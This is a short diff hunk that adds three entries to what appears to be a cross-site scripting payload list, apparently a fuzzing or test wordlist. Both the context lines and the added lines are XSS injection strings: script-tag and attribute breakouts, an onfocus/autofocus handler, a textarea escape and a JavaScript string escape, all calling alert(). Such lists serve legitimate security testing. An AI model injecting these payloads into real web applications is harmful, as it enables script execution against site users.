@@ -4,3 +4,6 @@
 "><script>alert(String.fromCharCode(88,83,83))</script>
 <iframe src=javascript:alert('XSS')>
 <body onload=alert('XSS')>
+" onfocus=alert(1) autofocus="
+</textarea><script>alert(1)</script>
+';alert(1);//
